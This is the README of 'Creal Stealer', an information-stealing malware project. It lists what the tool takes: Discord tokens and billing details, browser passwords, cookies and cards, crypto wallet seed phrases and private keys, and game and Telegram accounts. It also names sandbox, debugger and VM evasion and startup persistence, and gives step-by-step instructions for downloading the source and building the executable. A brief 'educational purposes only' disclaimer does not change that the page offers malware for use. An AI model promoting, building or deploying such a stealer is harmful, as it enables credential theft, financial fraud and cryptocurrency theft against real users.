<h1 align="center"> Creal Stealer </h1> 
<p align= "center"> <kbd> <img  src="https://i.imgur.com/MjoICHp.png"width="420"> </kbd><br><br>



<p align="center">⚠️ DO ONLY USE FOR EDUCATIONAL USECASES THIS IS A BACKUP FOR RESEACH ⚠️</p>




                                                      🤖 Features


-   Discord Information ⚔️
    -   Nitro
    -   Badges
    -   Billing
    -   Email
    -   Phone
    -   HQ Friends
    -   HQ Guilds
    -   Gift Codes



-   General Functions 
    -   Check if being run in a VirusTotal sandbox
    -   Adds file to startup
    -   Anti-Debug / Anti-VM / Anti-RDP / Blue Screen if detect


-   Discord Injection 
    - Send token, password, email and billing on login or when email/password is changed



-   Browser Data
    -   Cookies
    -   Passwords
    -   Histories
    -   Autofills
    -   Bookmarks
    -   Credit/Debit Cards
    -   From Chrome, Edge, Brave, Opera GX, and more...




-   Crypto Data 
    -   Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet and +40 wallets supported)
    -   Softwares (Exodus, Atomic, Guarda, Electrum, Zcash, Armory, Binance, Coinomi)
    -   Seedphrases and backup codes


-   Application Data 
    -   Steam
    -   Riot Games
    -   Telegram



-   System Information ⚙️
    -   User
    -   System
    -   Disk
    -   Network



-  📁 File Stealer
    -   Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes






                                                      ⬇️ Setup

1. [Download source code zip](https://github.com/Nikifishy/CrealStealerV2/archive/refs/heads/main.zip)
2. Extract zip
3. First install reqiured packages by double clicking `install.bat` file
4. Run the builder by double clicking the `builder.bat` file
5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `creal.exe`




                                                      ⚠️ Disclaimer

- This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>



                                                      🪪 License

- By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
